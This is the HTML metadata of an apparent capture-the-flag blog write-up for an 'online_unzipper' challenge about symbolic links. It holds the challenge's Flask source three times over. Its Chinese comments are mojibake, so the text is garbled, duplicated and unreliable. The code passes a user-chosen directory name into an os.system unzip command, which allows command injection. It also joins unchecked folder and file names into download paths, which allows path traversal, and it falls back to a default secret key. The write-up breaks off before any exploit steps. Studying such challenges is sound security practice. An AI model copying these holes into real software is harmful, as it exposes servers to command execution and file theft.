<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" online_unzipper è€ƒç‚¹ï¼šè½¯é“¾æ¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 import os import uuid from flask import Flask, request, redirect, url_for, send_file, render_template, session, send_from_directory, abort, Response # åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ï¼Œ__name__ç”¨äºç¡®å®šåº”ç”¨æ ¹ç›®å½•ä»¥ä¾¿æŸ¥æ‰¾èµ„æº app = Flask(__name__) # è®¾ç½®åº”ç”¨çš„å¯†é’¥ï¼Œç”¨äºåŠ å¯†ä¼šè¯ï¼ˆsessionï¼‰ã€‚ä¼˜å…ˆä»ç¯å¢ƒå˜é‡FLASK_SECRET_KEYè·å–ï¼Œè‹¥æœªè®¾ç½®åˆ™ä½¿ç”¨é»˜è®¤å€¼&#39;test_key&#39;ï¼ˆç”Ÿäº§ç¯å¢ƒåº”é¿å…ä½¿ç”¨é»˜è®¤å€¼ï¼‰ app.secret_key = os.environ.get(&#34;FLASK_SECRET_KEY&#34;, &#34;test_key&#34;) # å®šä¹‰æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è·¯å¾„ï¼Œè¿™é‡Œè®¾ç½®ä¸ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„&#34;uploads&#34;æ–‡ä»¶å¤¹ UPLOAD_FOLDER = os.path.join(os.getcwd(), &#34;uploads&#34;) # ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ï¼Œexist_ok=Trueè¡¨ç¤ºå¦‚æœç›®å½•å·²å­˜åœ¨ä¹Ÿä¸ä¼šå¼•å‘é”™è¯¯ os.makedirs(UPLOAD_FOLDER, exist_ok=True) # ç”¨ä¸€ä¸ªç®€å•çš„å­—å…¸æ¨¡æ‹Ÿç”¨æˆ·æ•°æ®åº“ï¼Œå­˜å‚¨ç”¨æˆ·åå’Œç”¨æˆ·ä¿¡æ¯ï¼ˆå¯†ç å’Œè§’è‰²ï¼‰ users = {} @app.route(&#34;/&#34;) def index(): &#34;&#34;&#34; æ ¹è·¯å¾„è·¯ç”±ã€‚ æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼ˆå³sessionä¸­æ˜¯å¦æœ‰usernameï¼‰ã€‚å¦‚æœæœªç™»å½•ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦‚æœå·²ç™»å½•ï¼Œé‡å®šå‘åˆ°ä¸Šä¼ é¡µé¢ã€‚ &#34;&#34;&#34; if &#34;username&#34; not in session: return redirect(url_for(&#34;login&#34;)) return redirect(url_for(&#34;upload&#34;)) @app.route(&#34;/register&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def register(): if request.method == &#34;POST&#34;: username = request.form[&#34;username&#34;] password = request.form[&#34;password&#34;] if username in users: return &#34;ç”¨æˆ·åå·²å­˜åœ¨&#34; users[username] = {&#34;password&#34;: password, &#34;role&#34;: &#34;user&#34;} return redirect(url_for(&#34;login&#34;)) return render_template(&#34;register.html&#34;) @app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def login(): if request.method == &#34;POST&#34;: username = request.form[&#34;username&#34;] password = request.form[&#34;password&#34;] if username in users and users[username][&#34;password&#34;] == password: session[&#34;username&#34;] = username session[&#34;role&#34;] = users[username][&#34;role&#34;] return redirect(url_for(&#34;upload&#34;)) else: return &#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#34; return render_template(&#34;login.html&#34;) @app.route(&#34;/logout&#34;) def logout(): &#34;&#34;&#34; ç”¨æˆ·ç™»å‡ºè·¯ç”±ã€‚ æ¸…é™¤sessionä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚ &#34;&#34;&#34; session.clear() return redirect(url_for(&#34;login&#34;)) @app.route(&#34;/upload&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def upload(): &#34;&#34;&#34; * ç®¡ç†å‘˜ï¼ˆadminï¼‰å¯ä»¥é€‰æ‹©ä½¿ç”¨è¡¨å•æä¾›çš„dirnameæˆ–è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªUUIDä½œä¸ºç›®å½•åã€‚ * æ™®é€šç”¨æˆ·ï¼ˆuserï¼‰ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„UUIDä½œä¸ºç›®å½•åã€‚ - åœ¨ä¸Šä¼ ç›®å½•ä¸‹åˆ›å»ºç›®æ ‡å­ç›®å½•ã€‚ - å°†ä¸Šä¼ çš„zipæ–‡ä»¶ä¿å­˜åˆ°ç›®æ ‡ç›®å½•ä¸­ï¼Œå‘½åä¸º&#39;upload.zip&#39;ã€‚ - å°è¯•ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤è§£å‹è¯¥zipæ–‡ä»¶åˆ°ç›®æ ‡ç›®å½•ã€‚ - åˆ é™¤åŸå§‹çš„zipæ–‡ä»¶ã€‚ - è¿”å›è§£å‹æˆåŠŸä¿¡æ¯å’Œä¸€ä¸ªæŒ‡å‘ä¸‹è½½é¡µé¢çš„é“¾æ¥ã€‚ &#34;&#34;&#34; if &#34;username&#34; not in session: return redirect(url_for(&#34;login&#34;)) if request.method == &#34;POST&#34;: file = request.files[&#34;file&#34;] if not file: return &#34;æœªé€‰æ‹©æ–‡ä»¶&#34; role = session[&#34;role&#34;] if role == &#34;admin&#34;: dirname = request.form.get(&#34;dirname&#34;) or str(uuid.uuid4()) else: dirname = str(uuid.uuid4()) target_dir = os.path.join(UPLOAD_FOLDER, dirname) os.makedirs(target_dir, exist_ok=True) zip_path = os.path.join(target_dir, &#34;upload.zip&#34;) file.save(zip_path) try: os.system(f&#34;unzip -o {zip_path} -d {target_dir}&#34;) except: return &#34;è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼&#34; os.remove(zip_path) return f&#34;è§£å‹å®Œæˆï¼&lt;br&gt;ä¸‹è½½åœ°å€: &lt;a href=&#39;{url_for(&#39;download&#39;, folder=dirname)}&#39;&gt;{request.host_url}download/{dirname}&lt;/a&gt;&#34; return render_template(&#34;upload.html&#34;) @app.route(&#34;/download/&lt;folder&gt;&#34;) def download(folder): &#34;&#34;&#34; æ–‡ä»¶ä¸‹è½½åˆ—è¡¨é¡µé¢è·¯ç”±ã€‚ æ ¹æ®URLä¸­çš„folderå‚æ•°ï¼Œå®šä½åˆ°ä¸Šä¼ ç›®å½•ä¸‹çš„å…·ä½“å­ç›®å½•ã€‚ æ£€æŸ¥è¯¥å­ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿”å›404é”™è¯¯ã€‚ è·å–è¯¥å­ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶æ¸²æŸ“ä¸‹è½½é¡µé¢æ¨¡æ¿ï¼Œå°†æ–‡ä»¶å¤¹åå’Œæ–‡ä»¶åˆ—è¡¨ä¼ é€’ç»™æ¨¡æ¿ã€‚ &#34;&#34;&#34; target_dir = os.path.join(UPLOAD_FOLDER, folder) if not os.path.exists(target_dir): abort(404) files = os.listdir(target_dir) return render_template(&#34;download.html&#34;, folder=folder, files=files) @app.route(&#34;/download/&lt;folder&gt;/&lt;filename&gt;&#34;) def download_file(folder, filename): &#34;&#34;&#34; å•ä¸ªæ–‡ä»¶ä¸‹è½½è·¯ç”±ã€‚ æ ¹æ®URLä¸­çš„folderå’Œfilenameå‚æ•°ï¼Œæ„å»ºæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ å°è¯•æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œç„¶åè¿”å›ä¸€ä¸ªResponseå¯¹è±¡ï¼Œè®¾ç½®é€‚å½“çš„MIMEç±»å‹å’ŒContent-Dispositionå¤´éƒ¨ä»¥è§¦å‘æµè§ˆå™¨ä¸‹è½½ã€‚ å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿”å›404é”™è¯¯ï¼›å…¶ä»–é”™è¯¯è¿”å›500é”™è¯¯ã€‚ &#34;&#34;&#34; file_path = os.path.join(UPLOAD_FOLDER, folder, filename) try: with open(file_path, &#39;r&#39;) as file: # æ³¨æ„ï¼šå¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ï¼‰ï¼Œåº”ä½¿ç”¨&#39;rb&#39;æ¨¡å¼ content = file.read() return Response( content, mimetype=&#34;application/octet-stream&#34;, headers={ &#34;Content-Disposition&#34;: f&#34;attachment; filename={filename}&#34; } ) except FileNotFoundError: return &#34;File not found&#34;, 404 except Exception as e: return f&#34;Error: {str(e)}&#34;, 500 if __name__ == &#34;__main__&#34;: # å¯åŠ¨Flaskå¼€å‘æœåŠ¡å™¨ï¼Œç›‘å¬æ‰€æœ‰å…¬å…±IPï¼ˆ0.0.0.0ï¼‰ app.run(host=&#34;0.0.0.0&#34;) æ‰“è½¯é“¾æ¥ï¼Œåœ¨è™šæ‹Ÿæœºè¿›è¡Œä¸‹é¢å‘½ä»¤\n">
<title>2025N1CTF</title>

<link rel='canonical' href='https://luo-kaihong.github.io/p/2025n1ctf/'>

<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025N1CTF">
<meta property='og:description' content=" online_unzipper è€ƒç‚¹ï¼šè½¯é“¾æ¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 import os import uuid from flask import Flask, request, redirect, url_for, send_file, render_template, session, send_from_directory, abort, Response # åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ï¼Œ__name__ç”¨äºç¡®å®šåº”ç”¨æ ¹ç›®å½•ä»¥ä¾¿æŸ¥æ‰¾èµ„æº app = Flask(__name__) # è®¾ç½®åº”ç”¨çš„å¯†é’¥ï¼Œç”¨äºåŠ å¯†ä¼šè¯ï¼ˆsessionï¼‰ã€‚ä¼˜å…ˆä»ç¯å¢ƒå˜é‡FLASK_SECRET_KEYè·å–ï¼Œè‹¥æœªè®¾ç½®åˆ™ä½¿ç”¨é»˜è®¤å€¼&#39;test_key&#39;ï¼ˆç”Ÿäº§ç¯å¢ƒåº”é¿å…ä½¿ç”¨é»˜è®¤å€¼ï¼‰ app.secret_key = os.environ.get(&#34;FLASK_SECRET_KEY&#34;, &#34;test_key&#34;) # å®šä¹‰æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è·¯å¾„ï¼Œè¿™é‡Œè®¾ç½®ä¸ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„&#34;uploads&#34;æ–‡ä»¶å¤¹ UPLOAD_FOLDER = os.path.join(os.getcwd(), &#34;uploads&#34;) # ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ï¼Œexist_ok=Trueè¡¨ç¤ºå¦‚æœç›®å½•å·²å­˜åœ¨ä¹Ÿä¸ä¼šå¼•å‘é”™è¯¯ os.makedirs(UPLOAD_FOLDER, exist_ok=True) # ç”¨ä¸€ä¸ªç®€å•çš„å­—å…¸æ¨¡æ‹Ÿç”¨æˆ·æ•°æ®åº“ï¼Œå­˜å‚¨ç”¨æˆ·åå’Œç”¨æˆ·ä¿¡æ¯ï¼ˆå¯†ç å’Œè§’è‰²ï¼‰ users = {} @app.route(&#34;/&#34;) def index(): &#34;&#34;&#34; æ ¹è·¯å¾„è·¯ç”±ã€‚ æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼ˆå³sessionä¸­æ˜¯å¦æœ‰usernameï¼‰ã€‚å¦‚æœæœªç™»å½•ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦‚æœå·²ç™»å½•ï¼Œé‡å®šå‘åˆ°ä¸Šä¼ é¡µé¢ã€‚ &#34;&#34;&#34; if &#34;username&#34; not in session: return redirect(url_for(&#34;login&#34;)) return redirect(url_for(&#34;upload&#34;)) @app.route(&#34;/register&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def register(): if request.method == &#34;POST&#34;: username = request.form[&#34;username&#34;] password = request.form[&#34;password&#34;] if username in users: return &#34;ç”¨æˆ·åå·²å­˜åœ¨&#34; users[username] = {&#34;password&#34;: password, &#34;role&#34;: &#34;user&#34;} return redirect(url_for(&#34;login&#34;)) return render_template(&#34;register.html&#34;) @app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def login(): if request.method == &#34;POST&#34;: username = request.form[&#34;username&#34;] password = request.form[&#34;password&#34;] if username in users and users[username][&#34;password&#34;] == password: session[&#34;username&#34;] = username session[&#34;role&#34;] = users[username][&#34;role&#34;] return redirect(url_for(&#34;upload&#34;)) else: return &#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#34; return render_template(&#34;login.html&#34;) @app.route(&#34;/logout&#34;) def logout(): &#34;&#34;&#34; ç”¨æˆ·ç™»å‡ºè·¯ç”±ã€‚ æ¸…é™¤sessionä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚ &#34;&#34;&#34; session.clear() return redirect(url_for(&#34;login&#34;)) @app.route(&#34;/upload&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def upload(): &#34;&#34;&#34; * ç®¡ç†å‘˜ï¼ˆadminï¼‰å¯ä»¥é€‰æ‹©ä½¿ç”¨è¡¨å•æä¾›çš„dirnameæˆ–è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªUUIDä½œä¸ºç›®å½•åã€‚ * æ™®é€šç”¨æˆ·ï¼ˆuserï¼‰ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„UUIDä½œä¸ºç›®å½•åã€‚ - åœ¨ä¸Šä¼ ç›®å½•ä¸‹åˆ›å»ºç›®æ ‡å­ç›®å½•ã€‚ - å°†ä¸Šä¼ çš„zipæ–‡ä»¶ä¿å­˜åˆ°ç›®æ ‡ç›®å½•ä¸­ï¼Œå‘½åä¸º&#39;upload.zip&#39;ã€‚ - å°è¯•ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤è§£å‹è¯¥zipæ–‡ä»¶åˆ°ç›®æ ‡ç›®å½•ã€‚ - åˆ é™¤åŸå§‹çš„zipæ–‡ä»¶ã€‚ - è¿”å›è§£å‹æˆåŠŸä¿¡æ¯å’Œä¸€ä¸ªæŒ‡å‘ä¸‹è½½é¡µé¢çš„é“¾æ¥ã€‚ &#34;&#34;&#34; if &#34;username&#34; not in session: return redirect(url_for(&#34;login&#34;)) if request.method == &#34;POST&#34;: file = request.files[&#34;file&#34;] if not file: return &#34;æœªé€‰æ‹©æ–‡ä»¶&#34; role = session[&#34;role&#34;] if role == &#34;admin&#34;: dirname = request.form.get(&#34;dirname&#34;) or str(uuid.uuid4()) else: dirname = str(uuid.uuid4()) target_dir = os.path.join(UPLOAD_FOLDER, dirname) os.makedirs(target_dir, exist_ok=True) zip_path = os.path.join(target_dir, &#34;upload.zip&#34;) file.save(zip_path) try: os.system(f&#34;unzip -o {zip_path} -d {target_dir}&#34;) except: return &#34;è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼&#34; os.remove(zip_path) return f&#34;è§£å‹å®Œæˆï¼&lt;br&gt;ä¸‹è½½åœ°å€: &lt;a href=&#39;{url_for(&#39;download&#39;, folder=dirname)}&#39;&gt;{request.host_url}download/{dirname}&lt;/a&gt;&#34; return render_template(&#34;upload.html&#34;) @app.route(&#34;/download/&lt;folder&gt;&#34;) def download(folder): &#34;&#34;&#34; æ–‡ä»¶ä¸‹è½½åˆ—è¡¨é¡µé¢è·¯ç”±ã€‚ æ ¹æ®URLä¸­çš„folderå‚æ•°ï¼Œå®šä½åˆ°ä¸Šä¼ ç›®å½•ä¸‹çš„å…·ä½“å­ç›®å½•ã€‚ æ£€æŸ¥è¯¥å­ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿”å›404é”™è¯¯ã€‚ è·å–è¯¥å­ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶æ¸²æŸ“ä¸‹è½½é¡µé¢æ¨¡æ¿ï¼Œå°†æ–‡ä»¶å¤¹åå’Œæ–‡ä»¶åˆ—è¡¨ä¼ é€’ç»™æ¨¡æ¿ã€‚ &#34;&#34;&#34; target_dir = os.path.join(UPLOAD_FOLDER, folder) if not os.path.exists(target_dir): abort(404) files = os.listdir(target_dir) return render_template(&#34;download.html&#34;, folder=folder, files=files) @app.route(&#34;/download/&lt;folder&gt;/&lt;filename&gt;&#34;) def download_file(folder, filename): &#34;&#34;&#34; å•ä¸ªæ–‡ä»¶ä¸‹è½½è·¯ç”±ã€‚ æ ¹æ®URLä¸­çš„folderå’Œfilenameå‚æ•°ï¼Œæ„å»ºæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ å°è¯•æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œç„¶åè¿”å›ä¸€ä¸ªResponseå¯¹è±¡ï¼Œè®¾ç½®é€‚å½“çš„MIMEç±»å‹å’ŒContent-Dispositionå¤´éƒ¨ä»¥è§¦å‘æµè§ˆå™¨ä¸‹è½½ã€‚ å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿”å›404é”™è¯¯ï¼›å…¶ä»–é”™è¯¯è¿”å›500é”™è¯¯ã€‚ &#34;&#34;&#34; file_path = os.path.join(UPLOAD_FOLDER, folder, filename) try: with open(file_path, &#39;r&#39;) as file: # æ³¨æ„ï¼šå¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ï¼‰ï¼Œåº”ä½¿ç”¨&#39;rb&#39;æ¨¡å¼ content = file.read() return Response( content, mimetype=&#34;application/octet-stream&#34;, headers={ &#34;Content-Disposition&#34;: f&#34;attachment; filename={filename}&#34; } ) except FileNotFoundError: return &#34;File not found&#34;, 404 except Exception as e: return f&#34;Error: {str(e)}&#34;, 500 if __name__ == &#34;__main__&#34;: # å¯åŠ¨Flaskå¼€å‘æœåŠ¡å™¨ï¼Œç›‘å¬æ‰€æœ‰å…¬å…±IPï¼ˆ0.0.0.0ï¼‰ app.run(host=&#34;0.0.0.0&#34;) æ‰“è½¯é“¾æ¥ï¼Œåœ¨è™šæ‹Ÿæœºè¿›è¡Œä¸‹é¢å‘½ä»¤\n">
<meta property='og:url' content='https://luo-kaihong.github.io/p/2025n1ctf/'>
<meta property='og:site_name' content='ç½—é“ é¸¿'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-09-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-13T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="2025N1CTF">
<meta name="twitter:description" content=" online_unzipper è€ƒç‚¹ï¼šè½¯é“¾æ¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 import os import uuid from flask import Flask, request, redirect, url_for, send_file, render_template, session, send_from_directory, abort, Response # åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ï¼Œ__name__ç”¨äºç¡®å®šåº”ç”¨æ ¹ç›®å½•ä»¥ä¾¿æŸ¥æ‰¾èµ„æº app = Flask(__name__) # è®¾ç½®åº”ç”¨çš„å¯†é’¥ï¼Œç”¨äºåŠ å¯†ä¼šè¯ï¼ˆsessionï¼‰ã€‚ä¼˜å…ˆä»ç¯å¢ƒå˜é‡FLASK_SECRET_KEYè·å–ï¼Œè‹¥æœªè®¾ç½®åˆ™ä½¿ç”¨é»˜è®¤å€¼&#39;test_key&#39;ï¼ˆç”Ÿäº§ç¯å¢ƒåº”é¿å…ä½¿ç”¨é»˜è®¤å€¼ï¼‰ app.secret_key = os.environ.get(&#34;FLASK_SECRET_KEY&#34;, &#34;test_key&#34;) # å®šä¹‰æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è·¯å¾„ï¼Œè¿™é‡Œè®¾ç½®ä¸ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„&#34;uploads&#34;æ–‡ä»¶å¤¹ UPLOAD_FOLDER = os.path.join(os.getcwd(), &#34;uploads&#34;) # ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨ï¼Œexist_ok=Trueè¡¨ç¤ºå¦‚æœç›®å½•å·²å­˜åœ¨ä¹Ÿä¸ä¼šå¼•å‘é”™è¯¯ os.makedirs(UPLOAD_FOLDER, exist_ok=True) # ç”¨ä¸€ä¸ªç®€å•çš„å­—å…¸æ¨¡æ‹Ÿç”¨æˆ·æ•°æ®åº“ï¼Œå­˜å‚¨ç”¨æˆ·åå’Œç”¨æˆ·ä¿¡æ¯ï¼ˆå¯†ç å’Œè§’è‰²ï¼‰ users = {} @app.route(&#34;/&#34;) def index(): &#34;&#34;&#34; æ ¹è·¯å¾„è·¯ç”±ã€‚ æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼ˆå³sessionä¸­æ˜¯å¦æœ‰usernameï¼‰ã€‚å¦‚æœæœªç™»å½•ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦‚æœå·²ç™»å½•ï¼Œé‡å®šå‘åˆ°ä¸Šä¼ é¡µé¢ã€‚ &#34;&#34;&#34; if &#34;username&#34; not in session: return redirect(url_for(&#34;login&#34;)) return redirect(url_for(&#34;upload&#34;)) @app.route(&#34;/register&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def register(): if request.method == &#34;POST&#34;: username = request.form[&#34;username&#34;] password = request.form[&#34;password&#34;] if username in users: return &#34;ç”¨æˆ·åå·²å­˜åœ¨&#34; users[username] = {&#34;password&#34;: password, &#34;role&#34;: &#34;user&#34;} return redirect(url_for(&#34;login&#34;)) return render_template(&#34;register.html&#34;) @app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def login(): if request.method == &#34;POST&#34;: username = request.form[&#34;username&#34;] password = request.form[&#34;password&#34;] if username in users and users[username][&#34;password&#34;] == password: session[&#34;username&#34;] = username session[&#34;role&#34;] = users[username][&#34;role&#34;] return redirect(url_for(&#34;upload&#34;)) else: return &#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#34; return render_template(&#34;login.html&#34;) @app.route(&#34;/logout&#34;) def logout(): &#34;&#34;&#34; ç”¨æˆ·ç™»å‡ºè·¯ç”±ã€‚ æ¸…é™¤sessionä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚ &#34;&#34;&#34; session.clear() return redirect(url_for(&#34;login&#34;)) @app.route(&#34;/upload&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;]) def upload(): &#34;&#34;&#34; * ç®¡ç†å‘˜ï¼ˆadminï¼‰å¯ä»¥é€‰æ‹©ä½¿ç”¨è¡¨å•æä¾›çš„dirnameæˆ–è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªUUIDä½œä¸ºç›®å½•åã€‚ * æ™®é€šç”¨æˆ·ï¼ˆuserï¼‰ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„UUIDä½œä¸ºç›®å½•åã€‚ - åœ¨ä¸Šä¼ ç›®å½•ä¸‹åˆ›å»ºç›®æ ‡å­ç›®å½•ã€‚ - å°†ä¸Šä¼ çš„zipæ–‡ä»¶ä¿å­˜åˆ°ç›®æ ‡ç›®å½•ä¸­ï¼Œå‘½åä¸º&#39;upload.zip&#39;ã€‚ - å°è¯•ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤è§£å‹è¯¥zipæ–‡ä»¶åˆ°ç›®æ ‡ç›®å½•ã€‚ - åˆ é™¤åŸå§‹çš„zipæ–‡ä»¶ã€‚ - è¿”å›è§£å‹æˆåŠŸä¿¡æ¯å’Œä¸€ä¸ªæŒ‡å‘ä¸‹è½½é¡µé¢çš„é“¾æ¥ã€‚ &#34;&#34;&#34; if &#34;username&#34; not in session: return redirect(url_for(&#34;login&#34;)) if request.method == &#34;POST&#34;: file = request.files[&#34;file&#34;] if not file: return &#34;æœªé€‰æ‹©æ–‡ä»¶&#34; role = session[&#34;role&#34;] if role == &#34;admin&#34;: dirname = request.form.get(&#34;dirname&#34;) or str(uuid.uuid4()) else: dirname = str(uuid.uuid4()) target_dir = os.path.join(UPLOAD_FOLDER, dirname) os.makedirs(target_dir, exist_ok=True) zip_path = os.path.join(target_dir, &#34;upload.zip&#34;) file.save(zip_path) try: os.system(f&#34;unzip -o {zip_path} -d {target_dir}&#34;) except: return &#34;è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼&#34; os.remove(zip_path) return f&#34;è§£å‹å®Œæˆï¼&lt;br&gt;ä¸‹è½½åœ°å€: &lt;a href=&#39;{url_for(&#39;download&#39;, folder=dirname)}&#39;&gt;{request.host_url}download/{dirname}&lt;/a&gt;&#34; return render_template(&#34;upload.html&#34;) @app.route(&#34;/download/&lt;folder&gt;&#34;) def download(folder): &#34;&#34;&#34; æ–‡ä»¶ä¸‹è½½åˆ—è¡¨é¡µé¢è·¯ç”±ã€‚ æ ¹æ®URLä¸­çš„folderå‚æ•°ï¼Œå®šä½åˆ°ä¸Šä¼ ç›®å½•ä¸‹çš„å…·ä½“å­ç›®å½•ã€‚ æ£€æŸ¥è¯¥å­ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿”å›404é”™è¯¯ã€‚ è·å–è¯¥å­ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶æ¸²æŸ“ä¸‹è½½é¡µé¢æ¨¡æ¿ï¼Œå°†æ–‡ä»¶å¤¹åå’Œæ–‡ä»¶åˆ—è¡¨ä¼ é€’ç»™æ¨¡æ¿ã€‚ &#34;&#34;&#34; target_dir = os.path.join(UPLOAD_FOLDER, folder) if not os.path.exists(target_dir): abort(404) files = os.listdir(target_dir) return render_template(&#34;download.html&#34;, folder=folder, files=files) @app.route(&#34;/download/&lt;folder&gt;/&lt;filename&gt;&#34;) def download_file(folder, filename): &#34;&#34;&#34; å•ä¸ªæ–‡ä»¶ä¸‹è½½è·¯ç”±ã€‚ æ ¹æ®URLä¸­çš„folderå’Œfilenameå‚æ•°ï¼Œæ„å»ºæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ å°è¯•æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œç„¶åè¿”å›ä¸€ä¸ªResponseå¯¹è±¡ï¼Œè®¾ç½®é€‚å½“çš„MIMEç±»å‹å’ŒContent-Dispositionå¤´éƒ¨ä»¥è§¦å‘æµè§ˆå™¨ä¸‹è½½ã€‚ å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿”å›404é”™è¯¯ï¼›å…¶ä»–é”™è¯¯è¿”å›500é”™è¯¯ã€‚ &#34;&#34;&#34; file_path = os.path.join(UPLOAD_FOLDER, folder, filename) try: with open(file_path, &#39;r&#39;) as file: # æ³¨æ„ï¼šå¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å›¾ç‰‡ï¼‰ï¼Œåº”ä½¿ç”¨&#39;rb&#39;æ¨¡å¼ content = file.read() return Response( content, mimetype=&#34;application/octet-stream&#34;, headers={ &#34;Content-Disposition&#34;: f&#34;attachment; filename={filename}&#34; } ) except FileNotFoundError: return &#34;File not found&#34;, 404 except Exception as e: return f&#34;Error: {str(e)}&#34;, 500 if __name__ == &#34;__main__&#34;: # å¯åŠ¨Flaskå¼€å‘æœåŠ¡å™¨ï¼Œç›‘å¬æ‰€æœ‰å…¬å…±IPï¼ˆ0.0.0.0ï¼‰ app.run(host=&#34;0.0.0.0&#34;) 